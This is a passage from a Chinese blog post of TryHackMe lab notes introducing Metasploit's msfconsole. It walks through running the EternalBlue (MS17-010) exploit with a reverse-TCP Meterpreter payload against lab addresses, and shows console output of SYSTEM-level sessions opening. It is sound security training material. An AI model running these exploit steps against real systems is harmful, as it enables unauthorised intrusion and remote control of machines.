Interact with a module by name or index, for example use 13 or use auxiliary/server/capture/telnet

msf6 &gt;
</code></pre>
<p>请记住，漏洞利用了目标系统上的漏洞，并且可能总是显示出意想不到的行为。排名较低的漏洞可能会完美地工作，而排名较高的漏洞可能不会，或者更糟，使目标系统崩溃。</p>
<figure data-type="image" tabindex="3"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230720134704546.png" alt="image-20230720134704546" loading="lazy"></figure>
<figure data-type="image" tabindex="4"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230720134712167.png" alt="image-20230720134712167" loading="lazy"></figure>
<h2 id="4使用模块">4.使用模块</h2>
<p>您可以启动连接到这个房间的目标机器来复制下面所示的示例。任何Metasploit版本5或6都会有类似于这里所示的菜单和屏幕，因此您可以使用AttackBox或安装在本地计算机上的任何操作系统。</p>
<p>如前所述，使用use命令和模块名称进入模块上下文后，需要设置参数。下面列出了您将使用的最常见参数。请记住，根据您使用的模块，可能需要设置其他或不同的参数。最好使用show options命令列出所需的参数。</p>
<p>所有参数使用相同的命令语法设置:<br>
set PARAMETER_NAME VALUE</p>
<p>在继续之前，请记住始终检查msfconsole提示符，以确保您处于正确的上下文中。在处理Metasploit时，您可能会看到五个不同的提示:</p>
<p>常规命令提示符:这里不能使用Metasploit命令。</p>
<p>Regular command prompt</p>
<pre><code class="language-shell-session">root@ip-10-10-XX-XX:~#
</code></pre>
<p>msfconsole提示符:msf6(或msf5取决于您安装的版本)是msfconsole提示符。正如您所看到的，这里没有设置上下文，因此不能在这里使用特定于上下文的命令来设置参数和运行模块。</p>
<p>Metasploit command prompt</p>
<pre><code class="language-shell-session">msf6 &gt;
</code></pre>
<p>上下文提示:一旦您决定使用一个模块并使用set命令来选择它，msfconsole将显示上下文。您可以在这里使用特定于上下文的命令(例如set RHOSTS 10.10.x.x)。</p>
<p>A context command prompt</p>
<pre><code class="language-shell-session">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt;
</code></pre>
<p>Meterpreter提示符:Meterpreter是一个重要的有效负载，我们将在本模块后面详细介绍。这意味着一个Meterpreter代理被加载到目标系统并连接回您。您可以在这里使用Meterpreter特定的命令。</p>
<p>A Meterpreter command prompt</p>
<pre><code class="language-shell-session">meterpreter &gt;
</code></pre>
<p>目标系统上的shell:一旦利用完成，您就可以访问目标系统上的命令shell。这是一个常规命令行，在这里键入的所有命令都在目标系统上运行。</p>
<p>A Meterpreter command prompt</p>
<pre><code class="language-shell-session">C:\Windows\system32&gt;
</code></pre>
<p>如前所述，show options命令将列出所有可用的参数。</p>
<p>The show options command</p>
<pre><code class="language-shell-session">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.44.70      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf6 exploit(windows/smb/ms17_010_eternalblue) &gt;
</code></pre>
<p>正如您在上面的屏幕截图中所看到的，其中一些参数需要一个值才能使漏洞发挥作用。一些必需的参数值将被预先填充，请确保检查这些值是否应该与目标保持一致。例如，web漏洞可以将RPORT(远程端口:Metasploit将尝试连接并运行该漏洞的目标系统上的端口)值预设为80，但您的目标web应用程序可以使用端口8080。</p>
<p>在本例中，我们将使用set命令将RHOSTS参数设置为目标系统的IP地址。</p>
<p>A Meterpreter command prompt</p>
<pre><code class="language-shell-session">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 10.10.165.39
rhosts =&gt; 10.10.165.39
msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.165.39     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.44.70      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf6 exploit(windows/smb/ms17_010_eternalblue) &gt;
</code></pre>
<p>设置参数后，可以使用show options命令检查设置的值是否正确。</p>
<p>你经常使用的参数有:</p>
<p>RHOSTS:“远程主机”，目标系统的IP地址。可以设置单个IP地址或网络范围。这将支持CIDR(无类域间路由)符号(/24，/16等)或网络范围(10.10.10)。X - 10.10.10.y)。您还可以使用一个列出目标的文件，每行一个目标，使用file:/path/of/the/target_file.txt，如下所示。</p>
<figure data-type="image" tabindex="5"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/138a36f26c25994fcfe47e1fab085ac8.png" alt="img" loading="lazy"></figure>
<p>RPORT:“远程端口”，易受攻击的应用程序运行在目标系统上的端口。<br>
有效载荷:您将与漏洞一起使用的有效载荷。<br>
LHOST:“Localhost”，攻击机器(您的AttackBox或Kali Linux)的IP地址。<br>
LPORT:“本地端口”，您将用于反向shell连接回的端口。这是攻击机器上的一个端口，您可以将其设置为任何其他应用程序未使用的任何端口。<br>
SESSION:使用Metasploit建立到目标系统的每个连接都有一个会话ID。您将在利用后模块中使用它，这些模块将使用现有连接连接到目标系统。</p>
<p>您可以再次使用set命令使用不同的值覆盖任何set参数。可以使用unset命令清除任意参数值，也可以使用unset all命令清除所有已设置的参数值。</p>
<p>The unset all command</p>
<pre><code class="language-shell-session">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; unset all
Flushing datastore...
msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf6 exploit(windows/smb/ms17_010_eternalblue) &gt;
</code></pre>
<p>您可以使用setg命令来设置将用于所有模块的值。setg命令的用途与set命令类似。不同之处在于，如果您使用set命令使用一个模块设置一个值，然后切换到另一个模块，则需要再次设置该值。setg命令允许您设置该值，以便在默认情况下跨不同模块使用该值。您可以使用unsetg清除setg中的任何值集。</p>
<p>下面的示例使用以下流程;</p>
<p>我们使用ms17_010_eternalblue可利用<br>
我们使用setg命令而不是set命令来设置RHOSTS变量<br>
我们使用back命令来离开漏洞利用上下文<br>
我们使用一个辅助工具(该模块是一个扫描程序，用于发现MS17-010漏洞)<br>
show options命令显示RHOSTS参数已经被目标系统的IP地址填充。</p>
<p>Navigating modules</p>
<pre><code class="language-shell-session">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue 
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; setg rhosts 10.10.165.39
rhosts =&gt; 10.10.165.39
msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; back
msf6 &gt; use auxiliary/scanner/smb/smb_ms17_010 
msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; show options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                                                Required  Description
   ----         ---------------                                                --------  -----------
   CHECK_ARCH   true                                                           no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                                                           no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                                                          no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /opt/metasploit-framework-5101/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS       10.10.165.39                                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
   RPORT        445                                                            yes       The SMB service port (TCP)
   SMBDomain    .                                                              no        The Windows domain to use for authentication
   SMBPass                                                                     no        The password for the specified username
   SMBUser                                                                     no        The username to authenticate as
   THREADS      1                                                              yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/smb/smb_ms17_010) &gt;
</code></pre>
<p>setg命令设置一个全局值，直到退出Metasploit或使用unsetg命令清除它为止。</p>
<h3 id="使用模块">使用模块</h3>
<p>一旦设置了所有模块参数，就可以使用exploit命令启动模块。Metasploit还支持run命令，这是为exploit命令创建的别名，因为在使用非exploit模块(端口扫描器、漏洞扫描器等)时，单词exploit没有意义。</p>
<p>可以不带任何参数或使用“-z”参数使用exploit命令。</p>
<p>exploit -z命令将在会话打开后立即运行该漏洞并后台运行该会话。</p>
<p>The exploit -z command</p>
<pre><code class="language-shell-session">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit -z

[*] Started reverse TCP handler on 10.10.44.70:4444 
[*] 10.10.12.229:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.12.229:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.12.229:445      - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.12.229:445 - Connecting to target for exploitation.
[+] 10.10.12.229:445 - Connection established for exploitation.
[+] 10.10.12.229:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.12.229:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.12.229:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.12.229:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.12.229:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.12.229:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.12.229:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.12.229:445 - Sending all but last fragment of exploit packet
[*] 10.10.12.229:445 - Starting non-paged pool grooming
[+] 10.10.12.229:445 - Sending SMBv2 buffers
[+] 10.10.12.229:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.12.229:445 - Sending final SMBv2 buffers.
[*] 10.10.12.229:445 - Sending last fragment of exploit packet!
[*] 10.10.12.229:445 - Receiving response from exploit packet
[+] 10.10.12.229:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.12.229:445 - Sending egg to corrupted connection.
[*] 10.10.12.229:445 - Triggering free of corrupted buffer.
[*] Sending stage (201283 bytes) to 10.10.12.229
[*] Meterpreter session 2 opened (10.10.44.70:4444 -&gt; 10.10.12.229:49186) at 2021-08-20 02:06:48 +0100
[+] 10.10.12.229:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.12.229:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.12.229:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Session 2 created in the background.
msf6 exploit(windows/smb/ms17_010_eternalblue) &gt;
</code></pre>
<p>这将返回上下文提示符，您可以从中运行漏洞利用程序。</p>
<p>有些模块支持check选项。这将检查目标系统是否易受攻击而不加以利用。</p>
<h3 id="会话">会话</h3>
<p>一旦漏洞被成功利用，就会创建一个会话。这是目标系统与Metasploit之间建立的通信通道。</p>
<p>您可以使用后台命令来后台会话提示符并返回到msfconsole提示符。</p>
<p>Backgrounding sessions</p>
<pre><code class="language-shell-session">meterpreter &gt; background
[*] Backgrounding session 2...
msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; 
</code></pre>
<p>或者，CTRL+Z可以用于后台会话。</p>
<p>可以从msfconsole提示符或任何上下文中使用sessions命令来查看现有会话。</p>
<p>Listing active sessions</p>
<pre><code class="language-shell-session">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -&gt; 10.10.12.229:49163 (10.10.12.229)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -&gt; 10.10.12.229:49186 (10.10.12.229)

msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; back
msf6 &gt; sessions 

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -&gt; 10.10.12.229:49163 (10.10.12.229)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -&gt; 10.10.12.229:49186 (10.10.12.229)

msf6 &gt;
</code></pre>
<p>要与任何会话交互，可以使用sessions -i命令和所需的会话号。</p>
<p>Interacting with sessions</p>
<pre><code class="language-shell-session">msf6 &gt; sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -&gt; 10.10.12.229:49163 (10.10.12.229)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -&gt; 10.10.12.229:49186 (10.10.12.229)

msf6 &gt; sessions -i 2
[*] Starting interaction with 2...

meterpreter &gt;
</code></pre>
<figure data-type="image" tabindex="6"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230720140109164.png" alt="image-20230720140109164" loading="lazy"></figure>
<h2 id="5总结">5.总结</h2>
<p>正如我们目前所看到的，Metasploit是一个强大的工具，可以促进开发过程。开发过程包括三个主要步骤;查找漏洞，定制漏洞，并利用易受攻击的服务。</p>
<p>Metasploit提供了许多模块，可以用于开发过程的每个步骤。通过这个房间，我们看到了Metasploit的基本组件和它们各自的用法。</p>
<p>最好还使用了ms17_010_eternalblue漏洞来访问目标VM。</p>
<p>在接下来的房间里，我们将更详细地介绍Metasploit及其组件。一旦完成，这个模块应该会让您对Metasploit的功能有一个很好的理解。</p>

                </div>
            </article>
        </div>

        
            <div class="next-post">
                <div class="next gt-c-content-color-first">下一篇</div>
                <a href="https://f9f.fun/post/tryhackme-nmap-xue-xi/" class="post-title gt-a-link">
                     Tryhackme-Nmap 学习
                </a>
            </div>
        

        
            <span id="/post/tryhackme-metasploit-introduction/" class="leancloud_visitors" data-flag-title="Tryhackme-Metasploit: Introduction">
                <em class="post-meta-item-text">阅读量 </em>
                <i class="leancloud-visitors-count">0</i>
            </span>
        

        
            
                <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css">
<script src="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js"></script>
<script>
    // md5.min.js
    !function(n){
        "use strict";
        function d(n,t){var r=(65535&n)+(65535&t);return(n>>16)+(t>>16)+(r>>16)<<16|65535&r}
        function f(n,t,r,e,o,u){return d((c=d(d(t,n),d(e,u)))<<(f=o)|c>>>32-f,r);var c,f}
        function l(n,t,r,e,o,u,c){return f(t&r|~t&e,n,t,o,u,c)}
        function v(n,t,r,e,o,u,c){return f(t&e|r&~e,n,t,o,u,c)}
        function g(n,t,r,e,o,u,c){return f(t^r^e,n,t,o,u,c)}
        function m(n,t,r,e,o,u,c){return f(r^(t|~e),n,t,o,u,c)}
        function i(n,t){var r,e,o,u,c;n[t>>5]|=128<<t%32,n[14+(t+64>>>9<<4)]=t;var f=1732584193,i=-271733879,a=-1732584194,h=271733878;for(r=0;r<n.length;r+=16)f=l(e=f,o=i,u=a,c=h,n[r],7,-680876936),h=l(h,f,i,a,n[r+1],12,-389564586),a=l(a,h,f,i,n[r+2],17,606105819),i=l(i,a,h,f,n[r+3],22,-1044525330),f=l(f,i,a,h,n[r+4],7,-176418897),h=l(h,f,i,a,n[r+5],12,1200080426),a=l(a,h,f,i,n[r+6],17,-1473231341),i=l(i,a,h,f,n[r+7],22,-45705983),f=l(f,i,a,h,n[r+8],7,1770035416),h=l(h,f,i,a,n[r+9],12,-1958414417),a=l(a,h,f,i,n[r+10],17,-42063),i=l(i,a,h,f,n[r+11],22,-1990404162),f=l(f,i,a,h,n[r+12],7,1804603682),h=l(h,f,i,a,n[r+13],12,-40341101),a=l(a,h,f,i,n[r+14],17,-1502002290),f=v(f,i=l(i,a,h,f,n[r+15],22,1236535329),a,h,n[r+1],5,-165796510),h=v(h,f,i,a,n[r+6],9,-1069501632),a=v(a,h,f,i,n[r+11],14,643717713),i=v(i,a,h,f,n[r],20,-373897302),f=v(f,i,a,h,n[r+5],5,-701558691),h=v(h,f,i,a,n[r+10],9,38016083),a=v(a,h,f,i,n[r+15],14,-660478335),i=v(i,a,h,f,n[r+4],20,-405537848),f=v(f,i,a,h,n[r+9],5,568446438),h=v(h,f,i,a,n[r+14],9,-1019803690),a=v(a,h,f,i,n[r+3],14,-187363961),i=v(i,a,h,f,n[r+8],20,1163531501),f=v(f,i,a,h,n[r+13],5,-1444681467),h=v(h,f,i,a,n[r+2],9,-51403784),a=v(a,h,f,i,n[r+7],14,1735328473),f=g(f,i=v(i,a,h,f,n[r+12],20,-1926607734),a,h,n[r+5],4,-378558),h=g(h,f,i,a,n[r+8],11,-2022574463),a=g(a,h,f,i,n[r+11],16,1839030562),i=g(i,a,h,f,n[r+14],23,-35309556),f=g(f,i,a,h,n[r+1],4,-1530992060),h=g(h,f,i,a,n[r+4],11,1272893353),a=g(a,h,f,i,n[r+7],16,-155497632),i=g(i,a,h,f,n[r+10],23,-1094730640),f=g(f,i,a,h,n[r+13],4,681279174),h=g(h,f,i,a,n[r],11,-358537222),a=g(a,h,f,i,n[r+3],16,-722521979),i=g(i,a,h,f,n[r+6],23,76029189),f=g(f,i,a,h,n[r+9],4,-640364487),h=g(h,f,i,a,n[r+12],11,-421815835),a=g(a,h,f,i,n[r+15],16,530742520),f=m(f,i=g(i,a,h,f,n[r+2],23,-995338651),a,h,n[r],6,-198630844),h=m(h,f,i,a,n[r+7],10,1126891415),a=m(a,h,f,i,n[r+14],15,-1416354905),i=m(i,a,h,f,n[r+5],21,-57434055),f=m(f,i,a,h,n[r+12],6,1700485571),h=m(h,f,i,a,n[r+3],10,-1894986606),a=m(a,h,f,i,n[r+10],15,-1051523),i=m(i,a,h,f,n[r+1],21,-2054922799),f=m(f,i,a,h,n[r+8],6,1873313359),h=m(h,f,i,a,n[r+15],10,-30611744),a=m(a,h,f,i,n[r+6],15,-1560198380),i=m(i,a,h,f,n[r+13],21,1309151649),f=m(f,i,a,h,n[r+4],6,-145523070),h=m(h,f,i,a,n[r+11],10,-1120210379),a=m(a,h,f,i,n[r+2],15,718787259),i=m(i,a,h,f,n[r+9],21,-343485551),f=d(f,e),i=d(i,o),a=d(a,u),h=d(h,c);return[f,i,a,h]}
        function a(n){var t,r="",e=32*n.length;for(t=0;t<e;t+=8)r+=String.fromCharCode(n[t>>5]>>>t%32&255);return r}
        function h(n){var t,r=[];for(r[(n.length>>2)-1]=void 0,t=0;t<r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t<e;t+=8)r[t>>5]|=(255&n.charCodeAt(t/8))<<t%32;return r}
        function e(n){var t,r,e="0123456789abcdef",o="";for(r=0;r<n.length;r+=1)t=n.charCodeAt(r),o+=e.charAt(t>>>4&15)+e.charAt(15&t);return o}
        function r(n){return unescape(encodeURIComponent(n))}
        function o(n){return a(i(h(t=r(n)),8*t.length));var t}
        function u(n,t){return function(n,t){var r,e,o=h(n),u=[],c=[];for(u[15]=c[15]=void 0,16<o.length&&(o=i(o,8*n.length)),r=0;r<16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(h(t)),512+8*t.length),a(i(c.concat(e),640))}(r(n),r(t))}
        function t(n,t,r){return t?r?u(t,n):e(u(t,n)):r?o(n):e(o(n))}
        "function"==typeof define&&define.amd?define(function(){return t}):"object"==typeof module&&module.exports?module.exports=t:n.md5=t;
    }(this);
</script>


<div id="gitalk-container"></div>

<script>

  var gitalk = new Gitalk({
    clientID: '',
    clientSecret: '',
    repo: '',
    owner: '',
    admin: [''],
    id: md5(location.pathname),      // Ensure uniqueness and length less than 50
    distractionFreeMode: false       // Facebook-like distraction free mode
  })

  gitalk.render('gitalk-container')

</script>

            

            
        

        
            <script src="//unpkg.com/valine@1.4.4/dist/Valine.min.js"></script>
<style>
	div#vcomments{
		width:100%;
		max-width: 1000px;
		padding: 2.5%
	}
</style>

	<div id="vcomments"></div>

<script>
	new Valine({
		el: '#vcomments',
		appId: '',
		appKey: '',
		avatar: '',
		pageSize: 5,
		recordIp: true,
		placeholder: 'Just Go Go',
		visitor: true,
		enableQQ: true,
		boolean: true,
	});
</script>

        

        <div class="site-footer gt-c-content-color-first">
    <div class="slogan gt-c-content-color-first">温故而知新</div>
    <div class="social-container">
        
            
        
            
        
            
        
            
        
            
        
            
        
    </div>
    <script src="/media/scripts/des.js"></script></br>
    <h4 id="sitetime"></h4></br>
    <div class="footer-info">
        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">F9F</a>
    </div>
    <div>
<div id="myModal" class="modal">
  <span class="close" onclick="document.getElementById('myModal').style.display='none'">&times;</span>
  <img class="modal-content" id="img01">
  <div id="caption"></div>
</div>
        Theme by <a href="https://www.minloha.cn" target="_blank">Minloha</a>, Powered by <a
                href="https://github.com" target="_blank">Gridea
    </div>
</div>
<script src="/media/scripts/Meting.min.js"></script>
<script src="/media/scripts/dialog.js"></script>
<script>
  hljs.initHighlightingOnLoad()
</script>

    </div>
</div>
</body>
</html>
